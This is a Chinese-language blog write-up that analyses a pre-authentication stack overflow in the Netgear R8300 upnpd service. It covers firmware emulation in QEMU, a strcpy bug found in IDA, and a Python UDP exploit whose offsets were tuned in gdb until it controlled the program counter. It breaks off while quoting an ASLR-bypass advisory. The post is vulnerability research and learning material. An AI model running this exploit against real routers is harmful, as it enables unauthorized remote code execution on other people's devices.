    <url>/2021/06/22/iot/Netgear%20R8300%E8%AE%A4%E8%AF%81%E5%89%8DRCE%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Netgear-R8300认证前RCE的漏洞分析及利用"><a href="#Netgear-R8300认证前RCE的漏洞分析及利用" class="headerlink" title="Netgear R8300认证前RCE的漏洞分析及利用"></a>Netgear R8300认证前RCE的漏洞分析及利用</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>通告<ul>
<li>NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入</li>
<li>R8300 running firmware versions prior to 1.0.2.134（之前的有洞，此修复</li>
<li>（仅此而已，没有说明哪个程序</li>
<li>R8300 running firmware versions prior to 1.0.2.134（之前有洞，这个修复</li>
</ul>
</li>
<li>在有设备的情况下，有多种直接获取系统 shell 的方式，如：<ol>
<li>硬件调试接口，如：UART</li>
<li>历史 RCE 漏洞，如：NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞<a href="https://www.seebug.org/vuldb/ssvid-98253" target="_blank" rel="noopener">【3】</a></li>
<li>设备自身的后门，Unlocking the Netgear Telnet Console<a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" target="_blank" rel="noopener">【4】</a></li>
<li>破解固件检验算法，开启 telnet 或植入反连程序。</li>
</ol>
</li>
<li>无设备<ul>
<li>理论上，只要 CPU 指令集对的上，就可以跑起来，</li>
<li>所以我们还可以利用手头的树莓派、路由器、摄像头的开发板等来运行。</li>
<li>最后一个就是基于 QEMU 的指令翻译</li>
</ul>
</li>
<li>文件夹对比找到有漏洞的二进制<ul>
<li>win的ultraCompare、Linux的meld（均不建议</li>
<li>自写py脚本</li>
<li>收集关键二进制及其目录，如upnpd、httpd，如/usr/sbin</li>
</ul>
</li>
<li>file usr/sbin/upnpd：ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<ul>
<li>LSB：小端</li>
<li>ARM, EABI5： <code>ARMv5</code> 架构</li>
<li>dynamically linked：动态链接</li>
<li>stripped：去除了符号表</li>
</ul>
</li>
<li>其他<ul>
<li>armel和armhf都是小端，hf-hard float，需要硬件支持，可简单理解为后者比前者新（使用时未发现区别</li>
<li>qemu所需镜像：<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></li>
</ul>
</li>
</ul>
<h2 id="qemu虚拟机"><a href="#qemu虚拟机" class="headerlink" title="qemu虚拟机"></a>qemu虚拟机</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1. sudo tunctl -t tap0 -u `whoami`（创建tap接口、需事先sudo apt install uml-utilities</span><br><span class="line">2. sudo ifconfig tap0 192.168.1.1/24（为新创建的tap接口配置IP、配置后ifconfig可见</span><br><span class="line">3. qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line">	（为方便封装在sh文件中、-M vexpress-a9指定架构、-kernel vmlinuz指定内核、-initrd指定init文件、file=指定镜像文件、-net tap指定接口类型，ifname=tap0接口名字、-nographic设置无界面</span><br><span class="line">4. root-root登录</span><br><span class="line">5. ifconfig eth0 192.168.1.2/24（为qemu虚拟机网卡分配IP</span><br><span class="line">6. ping 192.168.1.1（测试连通性</span><br><span class="line">7. tar -cvf 1.tar ./squashfs-root、scp -r 1.tar root@192.168.1.2:/root/（tar+scp传送squashfs-root，或wget+tar+py_server，最好打包</span><br><span class="line">8. mount -t proc /proc ./squashfs-root/proc;mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev（挂载proc、dev</span><br><span class="line">9. chroot ./squashfs-root/ sh（chroot并开启sh</span><br></pre></td></tr></table></figure>
<h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><ol>
<li>直接运行，没有任何输出，且ps没有</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /usr/sbin/upnpd </span></span><br><span class="line"><span class="comment"># ps |grep upnp |grep -v grep</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>没有报错信息就没法定位，sh脚本搭建调试环境，<a href="https://paper.seebug.org/480/#_5" target="_blank" rel="noopener">https://paper.seebug.org/480/#_5</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 </span></span><br><span class="line"><span class="comment"># cat start_debug.sh </span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">pid=`ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="variable">$pid</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">/usr/sbin/upnpd</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line"><span class="comment"># [  ]表示条件测试。注意这里的空格很重要。要注意在'['后面和']'前面都必须要有空格</span></span><br><span class="line"><span class="comment"># 等号左右不能有空格，pid=`ps | grep -v grep | grep upnpd | awk '&#123;print $1&#125;'`</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line"><span class="comment"># 选择对应的gdbserver：gdbserver-7.7.1-armel-eabi5-v1-sysv</span></span><br><span class="line">$ file usr/sbin/upnpd </span><br><span class="line">usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">$ file gdbserver-7.7.1-armel-eabi5-v1-sysv </span><br><span class="line">gdbserver-7.7.1-armel-eabi5-v1-sysv: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.26, BuildID[sha1]=589acbdf7b460493b7e40d618c5389a0a2dc24e1, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 </span></span><br><span class="line"><span class="comment"># 查看gdbserver用法</span></span><br><span class="line">qemu-arm gdbserver-7.7.1-armel-eabi5-v1-sysv --<span class="built_in">help</span></span><br><span class="line">Usage:</span><br><span class="line">	gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># ./start_debug.sh</span></span><br><span class="line"><span class="comment"># 总是打印gdbserver帮助信息，就是upnp没执行起来，ps+grep+awk没找到pid</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>找报错信息2法：sh+gdbserver搭建调试环境、qemu的–strace选项</li>
<li>qemu 添加<code>--strace</code>选项, 方便查看错误信息, 便于环境修复：<a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># chroot与qemu的-L选项还是有区别的</span></span><br><span class="line">sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br><span class="line">4147 open(<span class="string">"/var/run/upnpd.pid"</span>,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</span><br><span class="line">4147 <span class="built_in">exit</span>(2)</span><br><span class="line"></span><br><span class="line">sudo ./qemu-arm-static -L . --strace ./usr/sbin/upnpd</span><br><span class="line">4153 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4153 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 先用chroot法，mkdir后再运行</span></span><br><span class="line">lrwxrwxrwx  1 lxl lxl       7 Nov  9 09:53 var -&gt; tmp/var</span><br><span class="line">mkdir -p tmp/var/run</span><br><span class="line"></span><br><span class="line">4160 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4160 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># chroot + mkdir == —L的结果，因此倾向—L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 要解决nvram的问题，需要交叉编译libnvram，暂搁置//here</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>qemu找到原因，mkdir -p tmp/var/run解决，继续qemu虚拟机中（<a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 固件模拟时很常见的nvram问题</span></span><br><span class="line">/usr/sbin/upnpd </span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 现成的模拟nvram：https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 交叉编译，尽管有warning但是成功了</span></span><br><span class="line">/opt/cross_compile/armv5l/bin/armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 缺少dlsym</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so"</span> /usr/sbin/upnpd</span><br><span class="line">/usr/sbin/upnpd: can<span class="string">'t resolve symbol '</span>dlsym<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ grep -r "dlsym" .</span></span><br><span class="line"><span class="string">Binary file ./lib/libdl.so.0 matches</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span></span><br><span class="line"><span class="string">26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>配置/tmp/nvram.ini</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 新建/tmp/nvram.ini</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x01b52008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76f38c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00000000</span><br><span class="line">Cannot open /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line">touch /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 在nvram.ini中填充键值对</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76e96c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00cfe008</span><br><span class="line">[nvram 0]  = </span><br><span class="line">Read 1 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">'upnpd_debug_level'</span>) = <span class="string">''</span></span><br><span class="line">[0x0000e1e8] fopen(<span class="string">'/www/Public_UPNP_gatedesc.xml'</span>, <span class="string">'rb'</span>) = 0x00cfe008</span><br><span class="line">[0x0000e220] fopen(<span class="string">'/tmp/upnp_xml'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0000f520] acosNvramConfig_get(<span class="string">'lan_ipaddr'</span>) = <span class="string">''</span></span><br><span class="line">[0x76dd2838] acosNvramConfig_get(<span class="string">'hwrev'</span>) = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cat tmp/nvram.ini </span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.1.2</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br><span class="line"><span class="comment"># lan_ipaddr要改成自己对应的</span></span><br></pre></td></tr></table></figure>
<ol start="7">
<li>成功</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印信息的同时，也可以输入命令</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">ps |grep upnpd</span><br><span class="line"> 2513 0          3292 S   /usr/sbin/upnpd </span><br><span class="line"> 2522 0          1296 S   grep upnpd</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>小结<ol>
<li>sh脚本+gdbserver搭建调试环境</li>
<li>qemu的strace选项</li>
<li>交叉编译nvram.so</li>
<li>编辑nvram.ini</li>
</ol>
</li>
</ol>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
<li>/usr/sbin/upnpd，1900端口</li>
<li>recvfrom()、strcpy()</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://man7.org/linux/man-pages/man2/recvfrom.2.html</span></span><br><span class="line">recv, recvfrom, recvmsg - receive a message from a socket</span><br><span class="line">ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span><br><span class="line">                        struct sockaddr *src_addr, socklen_t *addrlen);                     </span><br><span class="line"><span class="comment"># 从socket中接受长度为len的数据，保存到buf中</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>IDA看成因（而非ghidra，ida可变量高亮、看出局部变量大小</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 接受长度为0x1FFFu的数据，保存到v54</span></span><br><span class="line">v27 = recvfrom(dword_C4580, v54, 0x1FFFu, 0, (struct sockaddr *)&amp;v62, (socklen_t *)&amp;v70);</span><br><span class="line"><span class="comment"># 2 v54作为参数1传入</span></span><br><span class="line">sub_25E04(v54, (int)&amp;v58, (unsigned __int16)(HIWORD(v62) &lt;&lt; 8) | (unsigned __int16)(HIWORD(v62) &gt;&gt; 8));</span><br><span class="line"><span class="comment"># 3 局部变量大小 0x634 - 0x58 = 0x5dc，小于0x1FFFu</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]</span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>通过 <code>checksec</code> 可知程序本身只开了 NX 保护，从原漏洞详情得知 R8300 上开了 ASLR</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ checksec usr/sbin/upnpd</span><br><span class="line">[*] <span class="string">'/home/lxl/Desktop/8/squashfs-root/usr/sbin/upnpd'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"><span class="comment"># NX是针对程序的，ASLR是针对设备/系统的</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>构造payload</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x7e2da53c</span>) +  <span class="comment"># v41</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +  <span class="comment"># dummy</span></span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># LR</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line">g = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line">g(<span class="number">1</span>)&gt;&gt;&gt;<span class="number">2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="string">"&lt;L"</span>，小端，unsigned long <span class="number">4</span>字节</span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">socket.SOCK_DGRAM，upnpd是upd</span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">p32(<span class="number">0x7e2da53c</span>)，十六进制转为bytes</span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line">upnpd是<span class="number">1900</span>端口，netstat -atp可见，但设备不支持p，故Google</span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">payload的构造要通过动态调试</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>搭建调试环境</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line">Attached; pid = 2617</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.1.1</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line">gdb-multiarch usr/sbin/upnpd</span><br><span class="line">gef➤  <span class="built_in">set</span> sysroot .</span><br><span class="line">gef➤  target remote 192.168.1.2:1234</span><br><span class="line">0x76d1a4c8 <span class="keyword">in</span> select () from ./lib/libc.so.0<span class="comment"># 连接后自动断在此处</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>pwntools确定偏移</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">con = remote(<span class="string">'192.168.1.2'</span>,1900)一直失败，故用socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 局部变量大小=0x5dc=1500，因此payload=1600*'a'</span></span><br><span class="line">import socket</span><br><span class="line">payload = 1600 * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.1.2'</span>, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># 但不符合预期，并没有控制pc为'aaaa'</span></span><br><span class="line"><span class="comment"># 总是断在strstr，0x76e01954 in strstr () from ./lib/libc.so.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 推测在return之前就崩溃了，再回到代码</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]<span class="comment"># 目标局部变量</span></span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line">  int *v51; // [sp+628h] [bp-30h]<span class="comment"># 指针</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v51 = &amp;v40;<span class="comment"># 指向v40</span></span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);<span class="comment"># 指针作为参数1传入</span></span><br><span class="line"><span class="comment"># *a1对指针解引用，指针也被覆盖为aaaa，自然崩溃</span></span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 构造payload时要注意：栈上有个指针v41指向v39的，覆盖的时候要将其指向有效地址，否则还没到return控制pc，就在strstr那崩溃了</span></span><br><span class="line">0x634-0x30 = 0x604</span><br><span class="line">在gdb中，target remote连接上后，会自动断在0x76d1a4c8，可直接用这个（不要写死，运行exp.py前再改，因为会变</span><br><span class="line">直接找一个字符串的地址，其不会变，如ida中.data:000556FC aMacBook        DCB <span class="string">"Mac Book"</span>,0</span><br><span class="line">gdb中：gef➤  x/1s 0x000556FC得到0x556fc:	<span class="string">"Mac Book"</span></span><br><span class="line">实测选择<span class="string">"Mac Book"</span>字符串有问题，exp后gdb断不下来</span><br><span class="line">const char *__fastcall sub_B60C(const char **a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">    v5 = strstr(*a1, a2);</span><br><span class="line">  v52 = <span class="string">' '</span>;</span><br><span class="line">  v7 = sub_B60C((const char **)&amp;v51, (const char *)&amp;v52);</span><br><span class="line">可能是<span class="string">"Mac Book"</span>找到了空格，影响了程序的执行，注意这点</span><br><span class="line"></span><br><span class="line">.data:00055666 aIphone         DCB <span class="string">"iPhone"</span>,0</span><br><span class="line">gef➤  x/1s 0x00055666</span><br><span class="line">0x55666:	<span class="string">"iPhone"</span></span><br><span class="line">还是不行</span><br><span class="line"></span><br><span class="line">strcpy，0x00055666，有00字符，截断了，自然没有崩</span><br><span class="line"></span><br><span class="line">那字符串就不行了，其地址都带着00</span><br><span class="line">选函数地址，如system，rop+system的利用方式，是直接将system函数地址写死在payload中的，可证明其地址不变，如果恰好包含0，再找其他库函数</span><br><span class="line">gef➤  x/10i system</span><br><span class="line">   0x76df6270 &lt;system&gt;:	ldr	r3, [pc, <span class="comment">#324]	; 0x76df63bc &lt;system+332&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原ssd文章也如此：https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</span></span><br><span class="line">In order to successfully change the PC value, we need to reach the <span class="built_in">return</span> part of vulFunction. We have to <span class="built_in">set</span> its value to an existing pointer value that exists <span class="keyword">in</span> memory (other loaded libraries <span class="built_in">functions</span>).</span><br><span class="line"><span class="comment"># 另一篇文章中：https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</span></span><br><span class="line">由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x00055666) +	<span class="comment"># v41</span></span><br><span class="line">    100 * <span class="string">'a'</span> <span class="comment"># 前二都是栈上局部变量，因此控制pc在此</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">成功控制pc</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x61616160 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x61616160 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>确定偏移</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    cyclic(100)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x6161616a in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x6161616a <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤ </span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616a</span><br><span class="line">36</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ cyclic -l 0x6161616b</span><br><span class="line">40</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意到之前aaaa时，pc为0x61616160，故pc为0x6161616a，找位置时要再+1，因为要对齐，奇数要变为偶数</span></span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[<span class="comment">#0] Id 1, stopped 0x62626262 in ?? (), reason: SIGSEGV</span></span><br><span class="line">0x62626262 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  </span><br><span class="line"></span><br><span class="line">验证正确</span><br><span class="line"></span><br><span class="line">控制pc处的偏移为：</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    0x604 * <span class="string">'a'</span> +</span><br><span class="line">    p32(0x76df6270) +	<span class="comment"># v41</span></span><br><span class="line">    40 * <span class="string">'a'</span> + </span><br><span class="line">    <span class="string">'bbbb'</span> <span class="comment"># pc</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004939.jpg" alt="image-20201118152102149"></p>
<ol start="6">
<li><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line"></span><br><span class="line">开了 NX 不能用 shellcode。</span><br><span class="line">有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="SSD"><a href="#SSD" class="headerlink" title="SSD"></a>SSD</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</a></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004938.jpg" alt="image-20201120164905786"></p>
<h3 id="文章内容"><a href="#文章内容" class="headerlink" title="文章内容"></a>文章内容</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ASLR Bypassing through Stack Reuse</span><br><span class="line"></span><br><span class="line">The router has the ASLR mitigation turned on, <span class="built_in">which</span> we can bypass using a ROP Attack. However, we are performing a copy call through the use of strcpy, <span class="built_in">which</span> is sensitive to NULL bytes, <span class="built_in">which</span> would <span class="keyword">in</span> turn prevent us to use the ROP attack. Therefore to utilize an address that contains a NULL byte, we will need to use a stack reuse attack.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># NX阻止shellcode在栈上执行，可用ret2libc绕过</span></span><br><span class="line"><span class="comment"># 但ASLR可阻止ret2libc：因为使得lib的加载基址不确定</span></span><br><span class="line"><span class="comment"># 